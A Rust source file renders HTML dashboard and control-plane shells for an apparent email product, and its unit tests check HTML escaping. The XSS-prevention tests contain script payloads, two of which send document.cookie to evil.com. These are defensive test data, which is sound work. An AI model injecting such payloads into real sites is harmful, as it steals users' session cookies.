/// Escape HTML special characters to prevent XSS in rendered shell output.
fn html_escape(s: &str) -> String {
    let mut escaped = String::with_capacity(s.len());
    for c in s.chars() {
        match c {
            '&' => escaped.push_str("&amp;"),
            '<' => escaped.push_str("&lt;"),
            '>' => escaped.push_str("&gt;"),
            '"' => escaped.push_str("&quot;"),
            '\'' => escaped.push_str("&#x27;"),
            _ => escaped.push(c),
        }
    }
    escaped
}

pub struct ShellSpec {
    pub name: &'static str,
    pub contract_id: &'static str,
    pub status: &'static str,
}

pub const SHELLS: &[ShellSpec] = &[
    ShellSpec { name: "WebDashboardShell", contract_id: "shell/web-dashboard", status: "implemented" },
    ShellSpec { name: "ControlPlaneShell", contract_id: "shell/control-plane", status: "implemented" },
];

const WEB_LAYOUT_SOURCE: &str = include_str!("../baselines/web/dashboard-layout.baseline.txt");
const WEB_SIDEBAR_SOURCE: &str = include_str!("../baselines/web/sidebar.baseline.txt");
const WEB_HEADER_SOURCE: &str = include_str!("../baselines/web/header.baseline.txt");
const WEB_IMPERSONATION_SOURCE: &str = include_str!("../baselines/web/impersonation-banner.baseline.txt");
const WEB_TOAST_STORE_SOURCE: &str = include_str!("../baselines/web/use-toast.baseline.txt");
const CONTROL_PLANE_SHELL_SOURCE: &str = include_str!("../baselines/control-plane/control-plane-shell.baseline.txt");
const CONTROL_PLANE_SIDEBAR_SOURCE: &str = include_str!("../baselines/control-plane/sidebar.baseline.txt");

pub fn ui_store_persistence_key() -> &'static str {
    "apexmail-ui"
}

pub fn toast_store_global() -> &'static str {
    "__apexmailToastStore__"
}

pub fn toast_remove_delay_ms() -> usize {
    5_000
}

pub fn header_shortcut_hint() -> &'static str {
    "⌘K"
}

pub fn shell_source_catalog() -> [(&'static str, &'static str); 7] {
    [
        ("web_layout", WEB_LAYOUT_SOURCE),
        ("web_sidebar", WEB_SIDEBAR_SOURCE),
        ("web_header", WEB_HEADER_SOURCE),
        ("web_impersonation_banner", WEB_IMPERSONATION_SOURCE),
        ("web_toast_store", WEB_TOAST_STORE_SOURCE),
        ("control_plane_shell", CONTROL_PLANE_SHELL_SOURCE),
        ("control_plane_sidebar", CONTROL_PLANE_SIDEBAR_SOURCE),
    ]
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHeader<'a> {
    pub search_query: &'a str,
    pub unread_count: usize,
    pub avatar_fallback: &'a str,
    pub mobile_menu_open: bool,
}

impl<'a> ShellHeader<'a> {
    pub fn render_html(&self) -> String {
        let badge = if self.unread_count > 0 {
            format!("<span class=\"inline-flex items-center rounded-sm border font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 max-w-fit border-transparent bg-destructive text-destructive-foreground shadow hover:bg-destructive/80 h-5 min-w-5 px-1.5 text-[12px]\">{}</span>", self.unread_count)
        } else {
            String::new()
        };

        let safe_query = html_escape(self.search_query);
        let safe_avatar = html_escape(self.avatar_fallback);
        format!(
            "<header class=\"sticky top-0 z-40 flex h-16 items-center justify-between border-b border-surface-200/70 bg-gradient-to-r from-background via-background to-brand-50/50 backdrop-blur-2xl px-6\"><div class=\"flex items-center gap-4\"><button class=\"md:hidden\" aria-label=\"{} menu\" aria-expanded=\"{}\"><span class=\"h-5 w-5\">≡</span></button><div class=\"relative hidden md:block\"><input type=\"search\" role=\"searchbox\" aria-label=\"Search campaigns and contacts\" value=\"{}\" class=\"w-64 pl-9 lg:w-80\" /><kbd class=\"pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 rounded-sm border\">{}</kbd></div></div><div class=\"flex items-center gap-2\"><button aria-label=\"Notifications\">{}</button>{}<div class=\"relative flex shrink-0 overflow-hidden rounded-lg border border-surface-200 shadow-sm h-10 w-10 rounded-lg\"><span class=\"flex h-full w-full items-center justify-center bg-surface-100 text-surface-600 font-bold text-xs uppercase tracking-wide\">{}</span></div></div></header>",
            if self.mobile_menu_open { "Close" } else { "Open" },
            if self.mobile_menu_open { "true" } else { "false" },
            safe_query,
            header_shortcut_hint(),
            badge,
            if self.unread_count > 0 { format!("<span class=\"sr-only\">{} unread notifications</span>", self.unread_count) } else { String::new() },
            safe_avatar,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ImpersonationBanner<'a> {
    pub tenant_id: &'a str,
    pub operator_name: &'a str,
    pub time_remaining: &'a str,
    pub end_session_error: Option<&'a str>,
    pub ending_session: bool,
}

impl<'a> ImpersonationBanner<'a> {
    pub fn render_html(&self) -> String {
        let error = self.end_session_error.map(|value| format!("<span class=\"text-xs font-medium text-white/95\">{}</span>", html_escape(value))).unwrap_or_default();
        let safe_tenant = html_escape(self.tenant_id);
        let safe_operator = html_escape(self.operator_name);
        let safe_time = html_escape(self.time_remaining);
        format!(
            "<div class=\"fixed top-0 left-0 right-0 z-[100] bg-warning text-white shadow-lg\" role=\"alert\" aria-live=\"polite\"><div class=\"max-w-7xl mx-auto px-4 py-2\"><div class=\"flex items-center justify-between\"><div class=\"flex items-center gap-3\"><div class=\"flex items-center gap-2 bg-white/20 rounded-full px-3 py-1\"><span class=\"w-4 h-4\">◉</span><span class=\"text-xs font-bold uppercase tracking-wide\">Impersonation Mode</span></div><div class=\"flex items-center gap-2 text-sm\"><span class=\"opacity-80\">Viewing as tenant:</span><span class=\"font-semibold bg-white/10 px-2 py-0.5 rounded\">{}</span></div><div class=\"hidden md:flex items-center gap-2 text-sm\"><span class=\"opacity-80\">Operator:</span><span class=\"font-medium\">{}</span></div></div><div class=\"flex items-center gap-4\">{}<div class=\"flex items-center gap-2 text-sm\"><span class=\"w-4 h-4\">!</span><span class=\"hidden sm:inline opacity-80\">Expires in:</span><span class=\"font-mono font-bold bg-white/20 px-2 py-0.5 rounded\">{}</span></div><button class=\"flex items-center gap-1.5 px-3 py-1.5 bg-white/20 hover:bg-white/30 rounded-lg text-sm font-semibold transition-colors\">{}</button></div></div></div></div>",
            safe_tenant,
            safe_operator,
            error,
            safe_time,
            if self.ending_session { "Ending…" } else { "End Session" },
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ToastSurface<'a> {
    pub toasts: Vec<&'a str>,
}

impl<'a> ToastSurface<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<section data-toast-store=\"{}\" data-remove-delay=\"{}\"><div role=\"region\" aria-live=\"polite\" aria-label=\"Notifications\" class=\"fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]\">{}</div></section>",
            toast_store_global(),
            toast_remove_delay_ms(),
            self.toasts.join(""),
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WebDashboardShell<'a> {
    pub sidebar_collapsed: bool,
    pub mobile_menu_open: bool,
    pub child_html: &'a str,
    pub header: ShellHeader<'a>,
    pub impersonation_banner: Option<ImpersonationBanner<'a>>,
    pub toast_surface: Option<ToastSurface<'a>>,
}

impl<'a> WebDashboardShell<'a> {
    pub fn render_html(&self) -> String {
        let sidebar_width = if self.sidebar_collapsed { "w-16" } else { "w-64" };
        let mobile_overlay = if self.mobile_menu_open {
            "<div class=\"fixed inset-0 z-40 bg-black/50 md:hidden\"></div><div class=\"fixed inset-y-0 left-0 z-50 w-64 md:hidden shadow-2xl\"></div>".to_string()
        } else {
            String::new()
        };
        let banner = self.impersonation_banner.as_ref().map(ImpersonationBanner::render_html).unwrap_or_default();
        let toast_surface = self.toast_surface.as_ref().map(ToastSurface::render_html).unwrap_or_default();
        format!(
            "<div class=\"flex h-screen overflow-hidden bg-surface-50\">{}<aside class=\"hidden md:flex {}\" data-sidebar-storage-key=\"{}\" aria-label=\"Primary sidebar navigation\"></aside>{}<div class=\"flex flex-1 flex-col overflow-hidden\">{}<main class=\"relative flex-1 overflow-y-auto bg-gradient-to-br from-surface-50 via-background to-brand-50/40 p-4 md:p-6 lg:p-8 safe-area-inset-bottom\"><div class=\"relative\">{}</div></main>{}</div></div>",
            banner,
            sidebar_width,
            ui_store_persistence_key(),
            mobile_overlay,
            self.header.render_html(),
            self.child_html,
            toast_surface,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OperationalBanner<'a> {
    pub tone: &'a str,
    pub message: &'a str,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ControlPlaneShell<'a> {
    pub mobile_menu_open: bool,
    pub user_role: &'a str,
    pub banners: Vec<OperationalBanner<'a>>,
    pub child_html: &'a str,
}

impl<'a> ControlPlaneShell<'a> {
    pub fn render_html(&self) -> String {
        let banner_markup = self.banners.iter().map(|banner| {
            format!("<div class=\"px-4 py-2 text-xs border-b {}\">{}</div>", control_plane_banner_class(banner.tone), html_escape(banner.message))
        }).collect::<Vec<_>>().join("");
        let mobile_sidebar = if self.mobile_menu_open {
            "translate-x-0"
        } else {
            "-translate-x-full"
        };
        format!(
            "<div class=\"min-h-screen bg-background\">{}<div class=\"md:hidden fixed left-0 right-0 top-0 z-40 flex items-center justify-between p-4 bg-card border-b border-border\"><div class=\"flex items-center gap-3\"><div class=\"w-8 h-8 bg-primary rounded-lg flex items-center justify-center text-primary-foreground font-bold text-sm\">A</div><span class=\"text-sm font-semibold text-foreground\">Control Plane</span></div><button aria-expanded=\"{}\" aria-label=\"{} navigation menu\" class=\"p-2 min-h-[44px] min-w-[44px]\">≡</button></div><div class=\"hidden md:block\"><aside class=\"fixed left-0 top-0 h-screen w-64\" data-user-role=\"{}\"></aside></div><div class=\"md:hidden fixed left-0 top-0 h-screen z-50 transition-transform duration-300 {}\"><aside class=\"h-full w-64\"></aside></div><main class=\"ml-0 md:ml-64 p-4 md:p-8 pt-4 md:pt-8\"><div class=\"cp-page-frame\">{}</div></main></div>",
            banner_markup,
            if self.mobile_menu_open { "true" } else { "false" },
            if self.mobile_menu_open { "Close" } else { "Open" },
            self.user_role,
            mobile_sidebar,
            self.child_html,
        )
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MarketingShell<'a> {
    pub child_html: &'a str,
}

impl<'a> MarketingShell<'a> {
    pub fn render_html(&self) -> String {
        format!(
            "<div class=\"font-apex antialiased text-[17px] leading-[1.6] min-h-screen safe-area-inset-bottom flex flex-col\"><header data-marketing-shell=\"header\"></header><main class=\"flex-1\">{}</main><footer data-marketing-shell=\"footer\"></footer><div data-marketing-shell=\"cookie-consent\"></div><button data-marketing-shell=\"back-to-top\"></button></div>",
            self.child_html,
        )
    }
}

fn control_plane_banner_class(tone: &str) -> &'static str {
    match tone {
        "critical" => "bg-destructive/10 text-destructive border-destructive/20",
        "warning" => "border-warning/20 bg-warning/10 text-warning",
        _ => "bg-primary/10 text-primary border-primary/20",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn exposes_shell_specs() {
        assert!(SHELLS.iter().any(|shell| shell.name == "WebDashboardShell"));
        assert!(SHELLS.iter().any(|shell| shell.name == "ControlPlaneShell"));
        assert_eq!(SHELLS.len(), 2);
    }

    #[test]
    fn shell_sources_capture_expected_contracts() {
        assert!(WEB_LAYOUT_SOURCE.contains("ImpersonationBanner"));
        assert!(WEB_SIDEBAR_SOURCE.contains("aria-current"));
        assert!(WEB_HEADER_SOURCE.contains("⌘K"));
        assert!(WEB_IMPERSONATION_SOURCE.contains("Impersonation Mode"));
        assert!(WEB_TOAST_STORE_SOURCE.contains("__apexmailToastStore__"));
        assert!(CONTROL_PLANE_SHELL_SOURCE.contains("Operator Shortcuts"));
        assert!(CONTROL_PLANE_SIDEBAR_SOURCE.contains("Control Plane"));
        assert_eq!(shell_source_catalog().len(), 7);
    }

    #[test]
    fn exposes_sidebar_persistence_and_toast_contracts() {
        assert_eq!(ui_store_persistence_key(), "apexmail-ui");
        assert_eq!(toast_store_global(), "__apexmailToastStore__");
        assert_eq!(toast_remove_delay_ms(), 5000);
        assert_eq!(header_shortcut_hint(), "⌘K");
    }

    #[test]
    fn renders_header_banner_and_toast_surface() {
        let header = ShellHeader {
            search_query: "campaigns",
            unread_count: 3,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
        let banner = ImpersonationBanner {
            tenant_id: "tenant_123",
            operator_name: "Operator Jane",
            time_remaining: "9:58",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        let toast_surface = ToastSurface { toasts: vec!["<div>Toast</div>"] }.render_html();

        assert!(header.contains("role=\"searchbox\""));
        assert!(header.contains("⌘K"));
        assert!(header.contains("3 unread notifications"));
        assert!(header.contains("aria-label=\"Open menu\""));
        assert!(banner.contains("Impersonation Mode"));
        assert!(banner.contains("tenant_123"));
        assert!(banner.contains("End Session"));
        assert!(toast_surface.contains("aria-label=\"Notifications\""));
        assert!(toast_surface.contains("data-toast-store=\"__apexmailToastStore__\""));
        assert!(toast_surface.contains("data-remove-delay=\"5000\""));
    }

    #[test]
    fn renders_web_control_plane_and_marketing_shells() {
        let web = WebDashboardShell {
            sidebar_collapsed: true,
            mobile_menu_open: true,
            child_html: "<section>Dashboard</section>",
            header: ShellHeader {
                search_query: "reports",
                unread_count: 1,
                avatar_fallback: "AR",
                mobile_menu_open: true,
            },
            impersonation_banner: Some(ImpersonationBanner {
                tenant_id: "tenant_7",
                operator_name: "Admin",
                time_remaining: "3:21",
                end_session_error: Some("Could not end impersonation session."),
                ending_session: false,
            }),
            toast_surface: Some(ToastSurface { toasts: vec!["<div>Saved</div>"] }),
        }
        .render_html();
        let control = ControlPlaneShell {
            mobile_menu_open: true,
            user_role: "admin",
            banners: vec![OperationalBanner { tone: "warning", message: "Safe mode active" }],
            child_html: "<section>Ops</section>",
        }
        .render_html();
        let marketing = MarketingShell { child_html: "<section>Hero</section>" }.render_html();

        assert!(web.contains("data-sidebar-storage-key=\"apexmail-ui\""));
        assert!(web.contains("w-16"));
        assert!(web.contains("Dashboard"));
        assert!(web.contains("Could not end impersonation session."));
        assert!(web.contains("Saved"));
        assert!(control.contains("data-user-role=\"admin\""));
        assert!(control.contains("Safe mode active"));
        assert!(control.contains("aria-label=\"Close navigation menu\""));
        assert!(control.contains("translate-x-0"));
        assert!(marketing.contains("data-marketing-shell=\"header\""));
        assert!(marketing.contains("data-marketing-shell=\"footer\""));
        assert!(marketing.contains("data-marketing-shell=\"cookie-consent\""));
        assert!(marketing.contains("data-marketing-shell=\"back-to-top\""));
    }

// ── XSS Prevention Tests ───────────────────────────────────

    #[test]
    fn header_search_query_escapes_xss() {
        let xss_payload = "<img src=x onerror=\"alert('xss')\">";
        let header = ShellHeader {
            search_query: xss_payload,
            unread_count: 0,
            avatar_fallback: "AM",
            mobile_menu_open: false,
        }
        .render_html();
// Raw XSS payload must NOT appear in output
        assert!(!header.contains(xss_payload), "raw XSS payload found in header output");
// Escaped version must appear instead
        assert!(header.contains("&lt;img src=x onerror="), "escaped XSS not found in header");
    }

    #[test]
    fn header_avatar_escapes_xss() {
        let xss_payload = "\"><script>alert(1)</script>";
        let header = ShellHeader {
            search_query: "safe",
            unread_count: 0,
            avatar_fallback: xss_payload,
            mobile_menu_open: false,
        }
        .render_html();
        assert!(!header.contains("<script>"), "unescaped script tag in avatar output");
        assert!(header.contains("&lt;script&gt;"), "escaped script tag not found");
    }

    #[test]
    fn impersonation_banner_escapes_tenant_id() {
        let xss_payload = "<script>document.location='https://evil.com?c='+document.cookie</script>";
        let banner = ImpersonationBanner {
            tenant_id: xss_payload,
            operator_name: "Safe Operator",
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(!banner.contains("<script>"), "unescaped script in tenant_id");
        assert!(banner.contains("&lt;script&gt;"), "escaped tenant_id not found");
    }

    #[test]
    fn impersonation_banner_escapes_operator_name() {
        let xss_payload = "Admin<img/src=x onerror=alert(1)>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: xss_payload,
            time_remaining: "5:00",
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(!banner.contains("onerror=alert(1)>"), "unescaped img tag in operator_name");
    }

    #[test]
    fn impersonation_banner_escapes_error_message() {
        let xss_payload = "<div onmouseover=\"alert('xss')\">Error</div>";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: "5:00",
            end_session_error: Some(xss_payload),
            ending_session: false,
        }
        .render_html();
// The angle brackets of the <div> tag must be escaped
        assert!(!banner.contains("<div onmouseover"), "unescaped <div> tag in error message");
        assert!(banner.contains("&lt;div onmouseover="), "escaped error message not found");
    }

    #[test]
    fn impersonation_banner_escapes_time_remaining() {
        let xss_payload = "\"><script>alert(1)</script><span x=\"";
        let banner = ImpersonationBanner {
            tenant_id: "safe_tenant",
            operator_name: "Admin",
            time_remaining: xss_payload,
            end_session_error: None,
            ending_session: false,
        }
        .render_html();
        assert!(!banner.contains("<script>alert(1)</script>"), "unescaped script in time_remaining");
    }

    #[test]
    fn control_plane_banner_escapes_message() {
        let xss_payload = "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>";
        let control = ControlPlaneShell {
            mobile_menu_open: false,
            user_role: "admin",
            banners: vec![OperationalBanner { tone: "critical", message: xss_payload }],
            child_html: "<section>Ops</section>",
        }
        .render_html();
        assert!(!control.contains("<script>fetch"), "unescaped script in control plane banner");
        assert!(control.contains("&lt;script&gt;"), "escaped banner message not found");
    }

    #[test]
    fn html_escape_covers_all_dangerous_chars() {
        assert_eq!(html_escape("<"), "&lt;");
        assert_eq!(html_escape(">"), "&gt;");
        assert_eq!(html_escape("&"), "&amp;");
        assert_eq!(html_escape("\""), "&quot;");
        assert_eq!(html_escape("'"), "&#x27;");
        assert_eq!(html_escape("safe text 123"), "safe text 123");
        assert_eq!(
            html_escape("<script>alert('xss')</script>"),
            "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
        );
    }
}